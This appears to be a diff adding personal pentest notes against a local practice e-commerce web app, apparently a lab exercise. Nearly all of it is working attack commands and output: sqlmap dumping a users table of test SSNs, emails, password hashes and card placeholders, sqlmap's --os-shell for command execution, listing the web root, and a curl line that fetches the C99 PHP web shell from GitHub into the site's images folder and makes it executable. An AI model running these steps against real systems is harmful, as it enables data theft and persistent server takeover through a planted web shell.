@@ -1,0 +1,52 @@
+1. Extracted user, password from users table
+sqlmap -u "http://localhost:8088/login.php" --data "username=foo&password=goo" -p "username,password" --method POST --batch -D public -T users –dump
+[23:32:14] [INFO] resuming password 'test' for hash '098f6bcd4621d373cade4e832627b4f6' for user 'test'
+[23:32:14] [INFO] resuming password 'demo' for hash 'fe01ce2a7fbac8fafaed7c982a04e229' for user 'demo'
+Database: public
+Table: users
+[2 entries]
++----+-------+-----------+---------------+--------------------------------+----------+-----------------------------------------+----------------------+
+| id | ssn   | name      | email         | address                        | username | password                                | credit_card          |
++----+-------+-----------+---------------+--------------------------------+----------+-----------------------------------------+----------------------+
+| 1  | SSN-1 | Test user | test@test.com | 1st Test Avenue, Washington DC | test     | 098f6bcd4621d373cade4e832627b4f6 (test) | VISA-1234-1234       |
+| 2  | SSN-2 | Demo user | demo@demo.com | 1st Demo St., Washington DC    | demo     | fe01ce2a7fbac8fafaed7c982a04e229 (demo) | Mastercard-1234-1234 |
++----+-------+-----------+---------------+--------------------------------+----------+-----------------------------------------+----------------------+
+
+But the passwords don't work. I can't login to the web application with the user test or demo.
+
+2. launch os commands via sqlmap
+sqlmap -u "http://localhost:8088/products/search.php?product=foo" --os-shell
+ps -ef
+
+3. root path of web app
+os-shell> ls -l /var/projects/ecommerce
+do you want to retrieve the command standard output? [Y/n/a] 
+command standard output:
+---
+total 84
+-rw-r--r--. 1 apache apache   142 Oct  2 12:17 config.php
+-rw-r--r--. 1 apache apache   330 Oct  6 19:36 contact.php
+-rw-r--r--. 1 apache apache   112 Oct  2 12:58 docontact.php
+-rw-r--r--. 1 apache apache   183 Oct  6 19:42 footer.php
+-rw-r--r--. 1 apache apache   837 Oct  6 20:00 header.php
+drwxrwxrwx. 2 apache apache    26 Feb 22 23:43 images
+-rwxr-xr-x. 1 apache apache   260 Oct  6 21:31 index.php
+-rwxr-xr-x. 1 apache apache    20 Oct  2 11:35 info.php
+-rw-r--r--. 1 apache apache   252 Oct  6 19:45 loginform.php
+-rw-r--r--. 1 apache apache  1207 Oct  6 23:22 login.php
+-rwxr-xr-x. 1 apache apache 35119 Oct  6 18:56 logo.png
+drwxr-xr-x. 2 apache apache    24 Oct  6 23:23 products
+-rw-r--r--. 1 root   root     833 Oct  6 23:23 secret.php
+-rw-r--r--. 1 apache apache   149 Oct  6 19:44 signup.php
+-rw-r--r--. 1 apache apache  2179 Oct  6 19:41 style.css
+---
+
+4. download an execute C99shell
+curl -o /var/projects/ecommerce/images/c99shell.php https://raw.githubusercontent.com/KaizenLouie/C99Shell-PHP7/master/c99shell.php
+chmod 755 /var/projects/ecommerce/images/c99shell.php
+id
+uid=26(postgres) gid=26(postgres) groups=26(postgres)
+
+open http://localhost:8088/images/c99shell.php in browser
+
+
